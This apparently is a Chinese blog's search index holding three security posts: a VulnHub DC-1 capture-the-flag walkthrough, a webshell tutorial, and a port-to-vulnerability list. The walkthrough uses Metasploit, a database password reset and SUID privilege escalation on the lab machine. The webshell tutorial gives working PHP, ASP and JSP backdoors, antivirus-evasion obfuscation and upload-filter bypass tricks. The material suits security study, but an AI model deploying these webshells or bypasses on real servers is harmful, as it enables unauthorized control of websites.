<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记一次打靶通关-DC1</title>
      <link href="/2023/08/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E9%80%9A%E5%85%B3-DC1/"/>
      <url>/2023/08/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E9%80%9A%E5%85%B3-DC1/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次快乐打靶经历-DC1"><a href="#记一次快乐打靶经历-DC1" class="headerlink" title="记一次快乐打靶经历-DC1"></a>记一次快乐打靶经历-DC1</h1><h2 id="1-靶场准备"><a href="#1-靶场准备" class="headerlink" title="1.靶场准备"></a>1.靶场准备</h2><p>攻击机：kali2023<br>靶机：DC-1（下载链接官网：<a href="https://www.vulnhub.com/%EF%BC%89">https://www.vulnhub.com/）</a><br>kali和DC-1都配置为nat模式<br><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8720.png" alt="准备"><br>（ps：有需要下载kali2023的可以发我邮箱要链接哦&gt;~&lt;）</p><h2 id="2-场景描述"><a href="#2-场景描述" class="headerlink" title="2.场景描述"></a>2.场景描述</h2><p>这个靶场假设了一个场景，攻击方和被攻击方处于同一个网段下，但是并不知道被攻击者的IP，期间穿插了几个flag作为提示，我们拿到root权限的标识是 <code>thefinalflag</code> ,下面开始快乐打靶</p><h2 id="3-攻击开始"><a href="#3-攻击开始" class="headerlink" title="3.攻击开始"></a>3.攻击开始</h2><ul><li>1.主机发现<br>我们面对一个完全未知的系统，我们首先要做的是获取被攻击者的IP，也就是主机发现，我们使用ARP扫描，我们可以看到这个网段中存活的主机如下，当然，我们除了用ARP，还可以使用netdiscover进行IP地址的探测</li></ul><p>探测当前网段所有IP地址：</p><blockquote><p>arp-scan -l</p></blockquote><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%872.png" alt="图一"></p><blockquote><p>netdiscover</p></blockquote><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%871.png" alt="图二"></p><ul><li>2.端口扫描<br>刚刚我们基本可以判断出来要攻击的主机ip是192.168.10.136，我们接下来对这个ip进行一个信息收集，首先我们用nmap扫描一下端口<blockquote><p>nmap -sV -p- 192.168.10.136</p></blockquote></li></ul><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%873.png" alt="图三"></p><ul><li>3.找切入点<br>首先常规思路目录扫描<blockquote><p>dirsearch -u 192.168.10.136  -e *</p></blockquote></li></ul><p>将可用目录（200，301，302全部保留），后续可能会用到。<br><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%874.png" alt="图四"></p><p>通过刚刚的nmap扫描，我们发现服务器开放80端口，直接通过ip访问网站，网站如下，只有一个登录页面，常规的我们可以测试sql，xss，csrf，ssrf，用户名枚举，暴力破解等等，但是全部失败<br><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%875.png" alt="图五"></p><p>那怎么办呢，当然是继续找切入点啦啦，分析网站框架，在本次打靶中是破局关键，在这里我们使用kali自带的whatweb工具，分析出的网站框架如下（ps：windows下可以直接使用wappalyzer插件）</p><blockquote><p>whatweb -v 192.168.10.136</p></blockquote><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%876.png" alt="图六"></p><p>发现php版本5.4.45+deb7u14&#x2F;&#x2F;&#x2F;drupal，不知道什么是druple，chatgpt告诉我们<strong>Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成.</strong></p><ul><li>4.漏洞利用</li></ul><p>根据我们收集到的一些信息，下面我们该进入到第二阶段漏洞探测和利用，我们暂时找的点是drupal开源框架的漏洞，进入kali的<code>Msfconsole</code>，这个模块是kali自带的开源的渗透测试框架,我们进入框架之后查找一下对应的漏洞，</p><blockquote><p>search drupal</p></blockquote><p>我们可以看到这个框架中存在很多漏洞，选择距离目前最近的并且Rank比较高的2018年漏洞，这样比较容易成功，</p><blockquote><p>use 开源漏洞目录</p></blockquote><p>我们现在进入它的目录下，查看需要配置的参数，</p><blockquote><p>show options</p></blockquote><p>我们可以看到yes的地方是必须填的，但是默认基本都帮我们填好了，我们只需要填靶机的IP也就是填Rhost，</p><blockquote><p>set Rhost 192.168.10.136</p></blockquote><p>然后我们开始攻击</p><blockquote><p>run</p></blockquote><p>这样他就会帮我们进行自动攻击，我们稍等一段时间，<br><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%877.png" alt="图七"><br>可以看到，现在session已经建立完成，我们可以查看DC-1基本信息</p><blockquote><p>sysinfo</p></blockquote><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%878.png" alt="图八"><br>到此，我们得到的是一个不完整的shell，所以使用python中的pty模块，来反弹一个完整的shell，</p><blockquote><p>Shell<br>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p></blockquote><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%879.png" alt="图九"></p><ul><li>5.内网渗透（后渗透阶段）<br>利用反弹shell进入到它www目录下，之后要进行内网渗透部分了，我们先看一下它目录下的文件，由于它是一个靶场，那最重要的文件就是flag；<blockquote><p>cat flag1.txt</p></blockquote></li></ul><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8710.png" alt="flag1"><br>这一套操作下来，我们就获得了第一个flag 1，它提示我们每一个好的CMS都需要一个配置文件， （ps：web服务器配置文件名称：setting-maven的全局配置文件，还有一个web.Config-web服务配置文件）<br>接下来我们找一下他这个配置文件在哪，找到之后cat一下这个文件看看配置</p><blockquote><p>find . -name “set*”<br>cat .&#x2F;sites&#x2F;default&#x2F;settings.php</p></blockquote><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8711.png" alt="flag2"><br>我们发现了这个配置文件中有flag 2，这个flag2给了提示是暴力和字典攻击不是最常见的，只有获得访问权限的方法，您能用这些证书做什么？暴力破解的话，可以想到前面80的登录框，意思就是没办法暴力破解登录，第二句话的意思应该是后续需要我们进行一个提权的操作，我们接着往下看，这边还给出了数据库的账号密码，我们登录一下他的数据库</p><blockquote><p>mysql -udbuser -pR0ck3t</p></blockquote><p>进入mysl，我们查看一下它的数据库</p><blockquote><p>show databases;</p></blockquote><p>可以看到数据名字叫drupaldb，我们进入drupaldb库中</p><blockquote><p>use drupaldb</p></blockquote><p>查看库中的表</p><blockquote><p>show tables;</p></blockquote><p>仔细观察一下，我们可以看到有一个users的表，查看表中内容</p><blockquote><p>select * from users\G;</p></blockquote><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8712.png" alt="图十"><br><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8713.png" alt="图十一"><br>在users表中，我们发现有admin用户，但是密码是加盐过的，一般加盐的密码是很难破解的，所以选择修改用户密码来解决。首先生成自定义密码的加盐哈希值。<br>回到&#x2F;var&#x2F;www下找一下文件中对密码进行加密的文件，<br>find . -name “<em>hash</em>”<br>找到文件后(.&#x2F;scripts&#x2F;password-hash.sh)大概查看下，简单运行下看看有什么东西</p><blockquote><p>.&#x2F;scripts&#x2F;password-hash.sh</p></blockquote><p>意思应该是直接再后面加密码就会返回加密后的结果,执行以下代码，生成自己的加盐密码，</p><blockquote><p>php scripts&#x2F;password-hash.sh 111111</p></blockquote><p>接下来我们重新进入数据库更新一下密码,先进入mysql</p><blockquote><p>mysql -udbuser -pR0ck3t</p></blockquote><p>进入到drupaldb库中</p><blockquote><p>use drupaldb</p></blockquote><p>更新密码</p><blockquote><p>update users set pass&#x3D;”$S$DXUFDdmLao0Af9D0WESwPFuvDML6ApJ426pu9Ij2YDobcwcIXq8H” where uid&#x3D;1;</p></blockquote><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8714.png" alt="图十二"></p><p>好的，我们可以看到密码已经修改成功了，我们进入网站登陆一下(admin,111111)<br><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8715.png" alt="图十三"></p><p>登陆成功，进入网站，点击左上角的Dashboard，查看到flag3.txt。<br><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8716.png" alt="flag3"></p><p>获得提示：<strong>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</strong><br>翻译是：特殊的PERMS将有助于查找密码，但您需要执行该命令才能找到阴影中的内容。根据flag3中提示，去查看存放用户信息的文件和存放密码信息的文件， </p><blockquote><p>cd &#x2F;etc      ls   cat shadow</p></blockquote><p>我们发现没有权限，我们看一下提示的另一个关键词passwd</p><blockquote><p>cat passwd</p></blockquote><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8717.png" alt="图十四"><br>发现有flag4，还给了个路径&#x2F;home&#x2F;flag4，那我们切换到flag4里面看看有什么文件</p><blockquote><p>cd &#x2F;home&#x2F;flag4    ls    cat flag4.txt</p></blockquote><p><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8718.png" alt="flag4"><br>它又给了我们提示<br><strong>Can you use this same method to find or access the flag in root?<br>Probably. But perhaps it’s not that easy.  Or maybe it is?</strong><br>翻译：你能用同样的方法在根目录中查找或访问标志吗？可能但也许这并不是那么容易。或者可能是这样？</p><ul><li>6.提权<br>需要我们在root下找到flag，发现权限不够。需要提权，首先试试SUID提权，查看默认以root权限执行的程序</li></ul><blockquote><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></blockquote><p>解释如下：<br>find 指令<br>&#x2F; 根目录(查找位置)<br>-perm 权限<br>-u 用户(s&#x3D;特权)<br>-type 类型<br>f 文件<br>2&gt;&#x2F;dev&#x2F;nul 过滤错误信息(不显示错误信息)<br>在这些文件中查找可以利用的点，发现find在root中。直接执行命令提权</p><blockquote><p>find -exec &#x2F;bin&#x2F;sh ;</p></blockquote><p>此时，我们切换到root目录下</p><blockquote><p>cd &#x2F;root</p></blockquote><p>看到了最后的flag，thefinalflag.txt !!!!!!!!<br><img src="https://jia-a-1319248288.cos.ap-hongkong.myqcloud.com/image/%E5%9B%BE%E7%89%8719.png" alt="thefinalflag"></p><p>渗透过程结束了,我们彻底拿下这台主机，拥有root权限，为所欲为。<br>真实环境下指路-&gt;《网络安全法》</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场，DC1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>木马详解</title>
      <link href="/2023/07/11/%E6%9C%A8%E9%A9%AC%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/07/11/%E6%9C%A8%E9%A9%AC%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="最全木马详解"><a href="#最全木马详解" class="headerlink" title="最全木马详解"></a>最全木马详解</h1><p>简单木马种类：asp、php、jsp、aspx<br>变形木马：htaccess，cer<br>先来看看最简单的一句话木马：<br>   <?php @eval($_POST['attack']);?></p><ul><li>代码解释：</li></ul><ol><li>@表示后面即使执行错误，也不报错：由于一个变量没有定义，就被拿去使用了，服务器就善意的提醒：Notice，你的xxx变量没有定义，会暴露密码，所以我们加上@</li><li>eval（）函数表示括号内的语句字符串什么的全都当做代码执行。想执行什么代码，就把什么代码放进变量attack位置下。如果想查看目标硬盘内容，可以用php函数：opendir()和readdir()等等。想上传内容就用php函数：move_uploaded_file。想执行cmd命令，则用exec()。前提是php配置文件php.ini里，关掉安全模式safe_mode &#x3D; off，然后再看看禁用函数列表 disable_functions &#x3D; proc_open, popen, <code>exec</code> , system, shell_exec ，把exec去掉，确保没有exec（有些cms为了方便处理某些功能，会去掉的）。</li><li>$_POST[‘attack’]表示从页面中获得attack这个参数值。</li></ol><ul><li>入侵条件</li></ul><ol><li>木马上传成功，未被杀；</li><li>知道木马的路径在哪；</li><li>上传的木马能正常运行。</li></ol><ul><li><p>常见形式<br>常见的一句话木马：<br>php的一句话木马： <?php @eval($_POST['pass']);?><br>asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language&#x3D;”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;<br>jsp的一句话是：</p></li><li><p>木马免杀</p></li></ul><p>一般网站管理员都会安装杀毒软件，即使木马上传成功，一段时间之后也会被杀掉，所以我们要对木马进行免杀操作，把它伪装的不像一个木马躲过杀毒软件。所以我们接下来要进行木马免杀操作。</p><ul><li>【免杀思路】：</li></ul><ol><li>将源代码进行再次编码。</li></ol><p>利用各种php变形函数，对一句话木马进行变形<br>ucwords() &#x2F;&#x2F;函数把字符串中每个单词的首字符转换为大写。<br>ucfirst() &#x2F;&#x2F;函数把字符串中的首字符转换为大写。<br>trim() &#x2F;&#x2F;函数从字符串的两端删除空白字符和其他预定义字符。<br>substr_replace() &#x2F;&#x2F;函数把字符串的一部分替换为另一个字符串<br>substr() &#x2F;&#x2F;函数返回字符串的一部分。<br>strtr() &#x2F;&#x2F;函数转换字符串中特定的字符。<br>strtoupper() &#x2F;&#x2F;函数把字符串转换为大写。<br>strtolower() &#x2F;&#x2F;函数把字符串转换为小写。<br>strtok() &#x2F;&#x2F;函数把字符串分割为更小的字符串<br>str_rot13() &#x2F;&#x2F;函数对字符串执行 ROT13 编码。</p><p>eval可以和assert交换,使用php一句话木马进行变形,代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);</span><br><span class="line">$a($_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>将那一句话木马进行base64编码，存放在”乱七八糟”的代码中。</li><li>还是一句话木马，进行在数组中键值对变形。</li></ol><p>小马和大马</p><p>小马和大马都是网页类型中的一种后门，是通过用来控制网站权限的，那最主要的区别就是小马是用来上传大马的。通过小马上传大马，这时候有个疑问了，那不是多此一举了，为什么要用小马来上传大马，而干嘛不直接上传大马用好了。其实这里是因为小马体积小，有比大马更强的隐蔽优势，而且有针对文件大小上传限制的漏洞，所以才有小马，小马也通常用来做留备用后门等。<br>网页小马</p><p>小马体积非常小，只有2KB那么大，隐蔽性也非常的好，因为小马的作用很简单，就是一个上传功能，就没有其它的了，它的作用仅仅是用来上传文件，所以也能过一些安全扫描。小马是为了方便上传大马的，因为很多漏洞做了上传限制，大马上传不了，所以就只能先上传小马，再接着通过小马上传大马了。小马还可以通过与图片合成一起通过IIS漏洞来运行。</p><p>Java语言编写的后台咱们使用JSP木马，与前面的一句话木马不同，菜刀中JSP木马较长，以下是一个简单的JSP小马：</p><p>&lt;%<br>    if(“123”.equals(request.getParameter(“pwd”))){<br>        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream();<br>        int a &#x3D; -1;<br>        byte[] b &#x3D; new byte[2048];<br>        out.print(“<pre>");<br>        while((a=in.read(b))!=-1){<br>            out.println(new String(b));<br>        }<br>        out.print("</pre>“);<br>    }<br>%&gt;</p><p>成功上传后如果能解析的话，请求：http:&#x2F;&#x2F;服务器IP:端口&#x2F;Shell&#x2F;cmd.jsp?pwd&#x3D;123&amp;i&#x3D;ipconfig 即可执行命令。<br>网页大马</p><p>大马的体积就比较大了，通常在50K左右，比小马会大好多倍，但对应的功能也很强大，包括对数据的管理，命令的操作，数据库的管理，解压缩，和提权等功能，都非常强大。这种大马一旦网站被种了，网站基本就在这个大马控制之中。大马的隐蔽性不好，因为涉及很多敏感代码，安全类程序很容易扫描到。</p><pre><code>中国菜刀的一句话不算，菜刀一句话通过客户端来操作也非常强大，一句话的代码可以和大马实现的一样。我们这里说的小马和大马是指网页类型中的，小马就是为了配合上传大马的，这是它最主要的作用，还有就是小马可以当做备用的后门来使用，一般大马容易被发现，而小马则更容易隐藏在系统的文件夹中。</code></pre><p>来看看一个大马利用实例：在虚拟机中往DVWA上传PHP大马（源码附在最后）:<br>访问木马文件123.php，提交密码123456后进入大马的功能列表，下图所示为文件管理功能：<br>在这里插入图片描述继续访问下命令执行功能（其他功能不展示了）：</p><pre><code>最后附上该PHP大马的代码（代码太长，百度云盘链接）：https://pan.baidu.com/s/1XGUp5Q_Q2zn46kcQxE5M3A</code></pre><p>WebShell</p><p>Webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p><p>webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。在国外，还有用python脚本语言写的动态网页，当然也有与之相关的webshell。 webshell根据功能也分为大马、小马和一句话木马，例如：&lt;%eval request(“pass”)%&gt;通常把这句话写入一个文档里面，然后文件名改成xx.asp。然后传到服务器上面。用eval方法将request(“pass”)转换成代码执行，request函数的作用是应用外部文件。这相当于一句话木马的客户端配置。具体分类如下图：</p><h1 id="木马生效方式：getshell-文件上传"><a href="#木马生效方式：getshell-文件上传" class="headerlink" title="木马生效方式：getshell+文件上传"></a>木马生效方式：getshell+文件上传</h1><h2 id="文件类型检测绕过"><a href="#文件类型检测绕过" class="headerlink" title="文件类型检测绕过"></a>文件类型检测绕过</h2><ol><li><p>更改请求绕过（MIME漏洞和前端JS漏洞）</p></li><li><p>Magic检测绕过</p></li></ol><p>有的站点使用文件头来检测文件类型，这种检查可以在Shell前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">类型 二进制值</span><br><span class="line">JPG FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">GIF 47 49 46 38 39 61</span><br><span class="line">PNG 89 50 4E 47</span><br><span class="line">TIF 49 49 2A 00</span><br><span class="line">BMP 42 4D</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>后缀绕过</li></ol><p>部分服务仅根据后缀、上传时的信息或Magic Header来判断文件类型，此时可以绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- php由于历史原因可以解析多种后缀，如 php / php5 / pht / phtml / shtml / pwml / phtm 等 可在禁止上传php文件时测试该类型。</span><br><span class="line"></span><br><span class="line">- jsp引擎则可能会解析 jspx / jspf / jspa / jsw / jsv / jtml 等后缀，asp支持 asa / asax / cer / cdx / aspx / ascx / ashx / asmx / asp&#123;80-90&#125; 等后缀。</span><br><span class="line"></span><br><span class="line">- 除了这些绕过，其他的后缀同样可能带来问题，如 vbs / asis / sh / reg / cgi / exe / dll / com / bat / pl / cfc / cfm / ini </span><br></pre></td></tr></table></figure><ol start="4"><li>系统命名绕过</li></ol><p>在Windows系统中，上传 index.php. 会重命名为 . ，可以绕过后缀检查。 也可尝试 index.php%20 ， index.php:1.jpg index.php::$DATA 等。<br>在Linux系统中，可以尝试上传名为 index.php&#x2F;. 或 .&#x2F;aa&#x2F;..&#x2F;index.php&#x2F;. 的文件</p><ol start="5"><li>user.ini</li></ol><p>在php执行的过程中，除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 .user.ini 中可以定义除了PHP_INI_SYSTEM以外的模式的选项，故可以使用 .user.ini 加上非php后缀的文件构造一个shell，比如 <code>auto_prepend_file=01.gif</code> </p><ol start="6"><li>WAF绕过</li></ol><p>有的waf在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数,另外，Waf和Web系统对 <code>boundary</code> 的处理不一致，可以使用错误的 boundary 来完成绕过。</p><ol start="7"><li>竞争上传绕过</li></ol><p>有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成Web Shell的文件并尝试访问，多次之后即可获得Shell。</p><h2 id="攻击技巧"><a href="#攻击技巧" class="headerlink" title="攻击技巧"></a>攻击技巧</h2><ol><li>Apache重写GetShell</li></ol><p>Apache可根据是否允许重定向考虑上传.htaccess,将png或者其他后缀的文件做php脚本执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">php_flag engine 1</span><br></pre></td></tr></table></figure><ol start="2"><li>软链接任意读文件</li></ol><p>上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件 若服务器没有做好防护，可实现任意文件读取的效果</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全，木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最全端口服务及对应漏洞</title>
      <link href="/2023/07/07/%E5%AE%89%E5%85%A8/"/>
      <url>/2023/07/07/%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="端口服务及对应漏洞"><a href="#端口服务及对应漏洞" class="headerlink" title="端口服务及对应漏洞"></a>端口服务及对应漏洞</h1><ul><li>端口号：<code>20、21</code> 服务：ftp  ，用于上传、下载文件。</li><li>端口号：<code>22</code>  服务：SSH远程连接，用于通过命令行模式 远程连接 Linux服务器或vps<br>           SSH弱口令破解、用户枚举、SSH隧道及内网代理转发、文件传输</li><li>端口号：<code>23</code> 服务：Telnet远程连接  密码爆破、弱口令</li><li>端口号：<code>25</code>  服务：SMTP邮件服务  邮件伪造</li><li>端口号：<code>53</code>  服务：DNS域名系统   DNS劫持、欺骗 vg  vg</li><li>端口号：<code>67/68</code> 服务：DHCP动态主机配置协议，</li><li>端口号：<code>69</code>  服务：tftp文件传输协议  下载、爆破和嗅探</li><li>端口号：<code>80</code> 服务：HTTP  用于 HTTP 服务提供访问功能如IIS、Apache、Nginx 等服务。第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</li><li>端口号：<code>110</code> 服务：POP3协议，邮件协议  爆破</li><li>端口号：<code>111</code> NFS</li><li>端口号：<code>139</code> 服务：Samba  爆破、未授权访问、远程代码执行</li><li>端口号：<code>143</code> 服务：IMAP 电子邮件的接收的协议。    爆破</li><li>端口号：<code>161</code>  服务：SNMP简单网络管理协议    爆破</li><li>端口号：<code>389</code>  服务：Ldap目录访问协议  注入、弱口令</li><li>端口号: <code>443</code>   服务：HTTPS 提访问功能，加密和通过安全端口传输的协议，SSL心脏滴血</li><li>端口号：<code>445</code>  用来访问共享文件夹，打印机</li><li>端口号：<code>873</code>,Rsync未授权</li><li>端口号：<code>1025</code>  NFS</li><li>端口号：<code>1433</code> 服务： SQL Server 用于供 SQL Server的TCP对外提供服务。扫描弱口令</li><li>端口号：<code>1434</code>服务： SQL Server的UDP 端口用于返回 SQL Server 使用了哪个 TCP&#x2F;IP 端口。</li><li>端口号：<code>1521</code>  服务：Oracle 数据库（收费）  TNS爆破、注入,扫描弱口令</li><li>端口号：<code>2049</code>  服务：nfs服务   上传、下载、文件共享</li><li>端口号：<code>2082/2083</code> cpanel主机管理系统登陆 （国外用较多）</li><li>端口号：<code>2222</code> DA虚拟主机管理系统登陆 （国外用较多）</li><li>端口号：<code>2601</code>,zebra路由，默认密码zebra</li><li>端口号：<code>2604</code> zebra路由，默认密码zebra</li><li>端口号：<code>3128</code> squid代理默认端口，如果没设置口令很可能就直接漫游内网了</li><li>端口号：<code>3306</code>  服务：MySql   爆破、注入、提权,扫描弱口令</li><li>端口号：<code>3312/3311</code> kangle主机管理系统登陆</li><li>端口号：<code>3389</code>  服务：远程桌面的服务端口  Shift后门</li><li>端口号：<code>4440</code> rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网</li><li>端口号：<code>5432</code>  服务：PostgreSQL（PG）  ,扫描弱口令</li><li>端口号：<code>5560,7778</code>  iSqlPlus数据库 ，Port数据库</li><li>端口号：<code>5900</code>  服务：VNC 虚拟网络控制台，vnc访问:192.168.1.203:1 那么他访问服务器的真正端口是5900+1&#x3D;5901 。 弱口令</li><li>端口号：<code>5984</code>       ，CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></li><li>端口号：<code>6082</code> varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站  被直接篡改或者作为代理进入内网</li><li>端口号：<code>6379</code>  服务：Redis数据库    爆破，redis未授权</li><li>端口号：<code>7001/7002</code>    服务：WebLogic控制台    WebLogic默认弱口令，Java反序列化</li><li>端口号：<code>8080</code> 服务：TCP,传输控制协议（计算机网络，传输层，和IP协议搭配使用）,第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</li><li>端口号：<code>8083</code> Vestacp主机管理系统 （国外用较多）</li><li>端口号：<code>8088</code> 服务：Nginx：轻量级的Web服务器&#x2F;反向代理服务器及电子邮件代理服务器。,</li><li>端口号：<code>9090</code>   服务：WebSphere控制台    Java反序列化,第三方通用组件漏洞struts thinkphp jboss ganglia                           zabbix</li><li>端口号：<code>9200,9300</code> elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</li><li>端口号：<code>10000</code> Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统</li><li>端口号：<code>11211</code> memcache未授权访问</li><li>端口号：<code>27017/27018</code>    服务：MongoDB   爆破、未授权访问</li><li>端口号：<code>50000</code>    SAP命令执行</li><li>端口号：<code>50070,50030</code>   hadoop默认端口未授权访问</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> port </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
